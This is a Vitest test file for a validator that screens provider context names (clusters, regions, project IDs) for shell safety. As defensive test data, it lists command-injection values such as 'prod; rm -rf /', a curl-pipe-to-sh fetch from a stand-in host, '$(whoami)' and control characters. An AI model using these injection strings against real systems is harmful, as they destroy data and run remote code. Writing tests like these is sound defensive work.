import { describe, expect, it } from 'vitest'

import { allShellSafe, isShellSafeValue } from './shell-safe'

describe('isShellSafeValue', () => {
  it('accepts the values real provider context names produce', () => {
    expect(isShellSafeValue('prod-cluster')).toBe(true)
    expect(isShellSafeValue('us-east-1')).toBe(true)
    expect(isShellSafeValue('europe-west4-a')).toBe(true)
    expect(isShellSafeValue('123456789012')).toBe(true)
    expect(isShellSafeValue('my.project-id')).toBe(true)
    expect(isShellSafeValue('my_project_2')).toBe(true)
  })

  it('rejects shell metacharacters', () => {
    expect(isShellSafeValue('prod; rm -rf /')).toBe(false)
    expect(isShellSafeValue('prod && curl evil.sh | sh')).toBe(false)
    expect(isShellSafeValue('prod$(whoami)')).toBe(false)
    expect(isShellSafeValue('prod`id`')).toBe(false)
    expect(isShellSafeValue("prod'quote")).toBe(false)
    expect(isShellSafeValue('prod cluster')).toBe(false)
    expect(isShellSafeValue('prod>out')).toBe(false)
    expect(isShellSafeValue('prod*')).toBe(false)
  })

  it('rejects control characters, which a PTY acts on before any shell parses quotes', () => {
    expect(isShellSafeValue('prodid;#')).toBe(false) // ETX cancels the line
    expect(isShellSafeValue('prod\nid')).toBe(false)
    expect(isShellSafeValue('prod\rid')).toBe(false)
    expect(isShellSafeValue('prod[A')).toBe(false)
    expect(isShellSafeValue('prod')).toBe(false)
    expect(isShellSafeValue('us-east-1\n')).toBe(false)
    expect(isShellSafeValue('us-east-1\r')).toBe(false)
  })

  it('rejects values whose first character the shell would expand', () => {
    expect(isShellSafeValue('-rf')).toBe(false)
    expect(isShellSafeValue('~root')).toBe(false)
    expect(isShellSafeValue('=ls')).toBe(false) // zsh equals-expansion
  })

  it('rejects empty and absent values', () => {
    expect(isShellSafeValue('')).toBe(false)
    expect(isShellSafeValue(null)).toBe(false)
    expect(isShellSafeValue(undefined)).toBe(false)
  })
})

describe('allShellSafe', () => {
  it('requires every value to pass', () => {
    expect(allShellSafe('prod', 'us-east-1', '123456789012')).toBe(true)
    expect(allShellSafe('prod', 'us-east-1; id')).toBe(false)
    expect(allShellSafe('prod', null)).toBe(false)
  })
})
